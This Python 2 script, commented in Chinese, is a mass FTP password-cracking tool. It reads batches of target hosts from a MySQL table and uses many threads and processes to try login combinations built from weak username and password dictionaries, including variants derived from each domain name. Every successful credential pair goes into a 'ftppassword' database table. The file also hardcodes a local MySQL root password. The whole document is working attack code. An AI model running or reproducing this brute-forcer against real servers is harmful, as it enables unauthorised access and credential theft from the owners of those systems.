# -*- coding: cp936 -*-

from mysql_handle import mysql_handle
from ftplib import FTP
import mysql
from collections import defaultdict, deque
from threading import Thread
import time #获取时间和延时
import socket
socket.setdefaulttimeout(10)

class crack_ftp(mysql_handle):   #创建FTP破解类
    def __init__(self):
        mysql_handle.__init__(self,'localhost','root','316118740','urldata')
        #username:pwd
        self.result={}
        self.url_list=[]
        self.ftp_list=[]    #保存100个URL地址
        self.app_list=[]
        self.mysql_connect()
        self.WEAK_USERNAME = [p.replace('\n','') for p in open('username.dic').readlines()]
        self.WEAK_PASSWORD = [p.replace('\n','') for p in open('password.dic').readlines()]
    def fetch_array(self):  #读取100个URL地址保存到数组
        try:
            data="select * from url where ftpsend is NULL limit 100"
            self.mysql_cursor()
            self.cursor.execute(data)
            ftp_list=[]#保存100个URL地址
            for url in self.cursor:
                ftp_list.append(url[0])#保存100个URL地址
                #print("url was {}".format(url[0]))
            self.ftp_list=(uu for uu in ftp_list)#保存100个URL地址
            #self.cnx.commit()
            self.cursor.close()
            return ftp_list
        except mysql.connector.Error as err:
            print("query err: {}".format(err))
    def send_confirm(self,data):
        #'''confirm the url'''
        self.mysql_connect()
        self.mysql_query(data)
    def domain_check(self):
        '''domain argv'''
    def weak_pwd(self):
        pass
    #def scanner(self):
    def get_sdomain(self,domain):  #域名拆解www.baidu.com->baidu.com
        suffixes = 'ac', 'ad', 'ae', 'aero', 'af', 'ag', 'ai', 'al', 'am', 'an', 'ao', 'aq', 'ar', 'arpa', 'as', 'asia', 'at', 'au', 'aw', 'ax', 'az', 'ba', 'bb', 'bd', 'be', 'bf', 'bg', 'bh', 'bi', 'biz', 'bj', 'bm', 'bn', 'bo', 'br', 'bs', 'bt', 'bv', 'bw', 'by', 'bz', 'ca', 'cat', 'cc', 'cd', 'cf', 'cg', 'ch', 'ci', 'ck', 'cl', 'cm', 'cn', 'co', 'com', 'coop', 'cr', 'cu', 'cv', 'cx', 'cy', 'cz', 'de', 'dj', 'dk', 'dm', 'do', 'dz', 'ec', 'edu', 'ee', 'eg', 'er', 'es', 'et', 'eu', 'fi', 'fj', 'fk', 'fm', 'fo', 'fr', 'ga', 'gb', 'gd', 'ge', 'gf', 'gg', 'gh', 'gi', 'gl', 'gm', 'gn', 'gov', 'gp', 'gq', 'gr', 'gs', 'gt', 'gu', 'gw', 'gy', 'hk', 'hm', 'hn', 'hr', 'ht', 'hu', 'id', 'ie', 'il', 'im', 'in', 'info', 'int', 'io', 'iq', 'ir', 'is', 'it', 'je', 'jm', 'jo', 'jobs', 'jp', 'ke', 'kg', 'kh', 'ki', 'km', 'kn', 'kp', 'kr', 'kw', 'ky', 'kz', 'la', 'lb', 'lc', 'li', 'lk', 'lr', 'ls', 'lt', 'lu', 'lv', 'ly', 'ma', 'mc', 'md', 'me', 'mg', 'mh', 'mil', 'mk', 'ml', 'mm', 'mn', 'mo', 'mobi', 'mp', 'mq', 'mr', 'ms', 'mt', 'mu', 'mv', 'mw', 'mx', 'my', 'mz', 'na', 'name', 'nc', 'ne', 'net', 'nf', 'ng', 'ni', 'nl', 'no', 'np', 'nr', 'nu', 'nz', 'om', 'org', 'pa', 'pe', 'pf', 'pg', 'ph', 'pk', 'pl', 'pm', 'pn', 'pr', 'pro', 'ps', 'pt', 'pw', 'py', 'qa', 're', 'ro', 'rs', 'ru', 'rw', 'sa', 'sb', 'sc', 'sd', 'se', 'sg', 'sh', 'si', 'sj', 'sk', 'sl', 'sm', 'sn', 'so', 'sr', 'st', 'su', 'sv', 'sy', 'sz', 'tc', 'td', 'tel', 'tf', 'tg', 'th', 'tj', 'tk', 'tl', 'tm', 'tn', 'to', 'tp', 'tr', 'tt', 'tv', 'tw', 'tz', 'ua', 'ug', 'uk', 'us', 'uy', 'uz', 'va', 'vc', 've', 'vg', 'vi', 'vn', 'vu', 'wf', 'ws', 'xn', 'ye', 'yt', 'za', 'zm', 'zw'
        sdomain = []
        bdomain = False
        for section in domain.split('.'):
            if section in suffixes:
                sdomain.append(section)
                bdomain = True
            else:
                sdomain = [section]
        return '.'.join(sdomain) if bdomain  else ''
    def get_ssdomain(self,domain):  #域名拆解www.baidu.com->baidu
        sdomain = self.get_sdomain(domain)  #先解析一道
        ssdomian = sdomain.partition('.')[0] if sdomain else ''
        return ssdomian
    def scanner(self,host,nthreads=10,port=21):    #创建破解线程
        try:
            ftpA = FTP()  #初始化FTP类
            ftpA.connect(host,port)  #连接 服务器名  端口号
            upf1 = "update url set ftpsend='send' where url='%s'"%(host)
            self.send_confirm(upf1)
            #print "heer"
        except Exception, e:
            #print u"\n%s服务器FTP21端口可能没有开放"%host
            upf2 = "update url set ftpsend='====' where url='%s'"%(host)
            print upf2
            #print type(upf2)
            self.mysql_query(upf2)
            return
            #print u"要扫描IP:",host,
        #得到sdomain和ssdomain
        domain = host   #不明白未什么还要赋值  直接使用host变量不就可以了吗
        sdomain = self.get_sdomain(domain)  #域名拆解www.baidu.com->baidu.com
        ssdomain = self.get_ssdomain(domain)  #域名拆解www.baidu.com->baidu
        #拆解不够完全有这样的一个玉米  123456.blog.baidu.com.cn   ！！！！！！！
        accounts = deque()   #list数组
        #准备 用户名和密码
        for username in self.WEAK_USERNAME:   #导入用户名#WEAK_USERNAME=username.dic
            if  '%domain%' in username or '%sdomain%' in username or '%ssdomain%' in username:
                if sdomain=='':
                    continue  #跳过
                else:
                    username = username.replace('%domain%',domain)  #返回根据正则表达式进行文字替换后的字符串的复制
                    username = username.replace('%sdomain%',sdomain)
                    username = username.replace('%ssdomain%',ssdomain)

            for password in self.WEAK_PASSWORD:   #导入密码#WEAK_PASSWORD=password.dic
                if '%domain%' in password or '%sdomain%' in password or '%ssdomain%' in password:
                    if sdomain=='':
                        continue  #跳过
                    else:
                        password = password.replace('%domain%',domain)
                        password = password.replace('%sdomain%',sdomain)
                        password = password.replace('%ssdomain%',ssdomain)

                password = password.replace('%null%','')
                password = password.replace('%username%',username)

                if (username,password) not in accounts:#list数组
                    accounts.append((username,password))#添加到 list数组
                    ##################################################################
                    #print u"组合出",len(accounts),u" 次密码"
        if not accounts:   #数组无数据了就跳出
            print u"%s 数组无数据"% host
            #在从新读取
            return 0

        print u"扫描网站FTP:%s 开始\n"% host,

        class crackThread(Thread):
            #破解 帐户线程
            def __init__(self):
                Thread.__init__(self)
                self.running = True  #这是  控制线程数量
                self.ftp = FTP()  #初始化FTP类
                #self.p_p_p=0 #心跳包
                #self.ftp.set_debuglevel(2)  #打开调试级别2，显示详细信息
            def send_pwd(self,data):
                new=mysql_handle('localhost','root','','urldata')
                print 'send pwd'
                try:
                    new.mysql_connect()
                    new.mysql_cursor()
                    new.cursor.execute(data)
                    #Make sure data is committed to the database
                    new.cnx.commit()
                    new.cursor.close()
                    print("query succ")
                    return True
                except mysql.connector.Error as err:
                    print("query err: {}".format(err))
            def run(self):
                MAX_RETRIES = 10
                retry = 0

                account = None   #None=NULL  数组
                while self.running and accounts:#list数组

                    try:
                        self.ftp.connect(domain,port)  #连接 服务器名  端口号
                    except Exception, e:
                        if retry <= MAX_RETRIES:  #这是为了控制线程吗
                            retry = retry +1    #没必要使用这个变量啊
                            continue  #跳过
                        else:
                            self.running = False  #这是  控制线程
                            break   #跳出

                    print ".",
                    #重新每三次    为什么一个账户要连接3次  呢
                    loop_num = 0
                    while loop_num<3:
                        loop_num = loop_num + 1

                        if not account and accounts:#list数组
                            account = accounts.pop()   #list数组  输出

                        #绝对不要尝试
                        if not account:   #数组无数据了就跳出
                            break   #跳出

                        #print u'IP:',host,u'用户名:',account[0],u'密码:',account[1]
                        #print ".",
                        #print u"正在扫描%s\r"%host
                        try:
                            self.ftp.connect()
                            self.ftp.login(account[0],account[1])  #连接FTP
                            #没有异常发生，这是一个正确的帐号
                            print u'\nFTP连接成功:IP',host,u"用户名：",account[0],u"密码：",account[1],
                            sqlcc="insert into ftppassword(IP,user,password,time) values('%s','%s','%s','%s')"%(host,account[0],account[1],time.strftime('%Y.%m.%d-%H.%M.%S'))
                            print sqlcc
                            if (self.send_pwd(sqlcc)):
                                print "add user and pwd succ"
                            else:
                                print 'error'
                            #os.system('python adminFTP.py %s %s %s'%(host,account[0],account[1]))
                            account = None  #None=NULL
                            self.ftp.quit()
                        except Exception, e:
                            emsg = str(e)    #调试信息

                            if 'connection' in emsg.lower() or 'tries' in emsg.lower():   #判断 连接  失败错误信息    不明白何意
                                retry = retry +1
                                break   #跳出
                            else:
                                #reset retry
                                account = None  #None=NULL
                                retry = 0

        threads = []  #线程
        for i in range(nthreads):  #nthreads=10  创建10个线程
            threads.append(crackThread())

        for thread in threads:   #不理解这是什么意思    是结束线程吗
            thread.start()  #start就是开始线程

        for thread in threads:   #不理解这是什么意思    是结束线程吗
            thread.join()
        print u"\n================%s扫描结束%s================"%(host,time.strftime('%Y.%m.%d-%H.%M.%S'))
    def schedule(self):
        pass
    def tes(self,fname):
        print fname
    def run(self):
        self.fetch_array()#读取100个URL地址保存到数组
        for addr in self.ftp_list:#保存100个URL地址
            print addr
            self.scanner(addr)  #创建破解线程
import multiprocessing

class multi_ftp(multiprocessing.Process):  #创建进程进行破解
    def __init__(self,addr):
        multiprocessing.Process.__init__(self)
        self.addr=addr
    def add_func(self):
        p=crack_ftp()#创建FTP破解类
        p.scanner(self.addr)  #创建破解线程
    def run(self):
        self.add_func()
def process_job(process_num,app_list):  #10   URL数组
    process_list=[]
    for i in range(process_num):
        p=multi_ftp(app_list[i])  #创建进程进行破解
        process_list.append(p)
    for i in range(process_num):
        process_list[i].daemon=True
        process_list[i].start()
    for i in range(process_num):
        process_list[i].join()
def sche():
    new=crack_ftp()#创建FTP破解类
    new.fetch_array()#读取100个URL地址保存到数组      在创建类的时候RUN就已经读取了为什么还要在读取个
    app_list=[]
    for i in new.ftp_list:  ##保存100个URL地址    读取出来
        print i
        i.replace('/','')
        app_list.append(i.strip())
        if len(app_list)==10:
            process_job(10,app_list)
            app_list=[]   #清空
if __name__=="__main__":
    for i in range(2000):
        sche()
